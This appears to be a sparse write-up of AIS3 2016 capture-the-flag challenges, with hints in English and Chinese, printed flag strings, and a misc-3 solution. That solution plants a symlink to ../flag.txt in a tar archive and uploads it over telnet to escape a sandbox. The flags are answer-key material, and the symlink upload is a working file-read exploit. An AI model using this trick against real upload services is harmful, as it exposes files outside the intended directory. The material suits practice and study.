## misc-1

Open the misc1.txt.

The key is `ais3{2016_^_^_hello_world!}`

## misc-2

Hint: 7Zip


## misc-3

Hint: symbolic link (透過 tar 可保留 synblic link)

`ln -s ../flag.txt guess.txt`

`tar cvf guess.tar guess.txt`

`python misc3_sol.py`

Here is the misc3_sol.py code 

```
import telnetlib

data = str.encode(list(open('guess.tar'))[0])
client = telnetlib.Telnet('quiz.ais3.org', 9150)
client.write(str.encode(str(len(data))) + '\n' + data)
print(client.read_all())
```

The key is `ais3{First t1me 1$sc4pe tHE S4nd80x}`

## crypto-1

Hint: XOR

可以透過 pwntool 破解此題

## crypto-2


## web-1


## web-2


## web-3



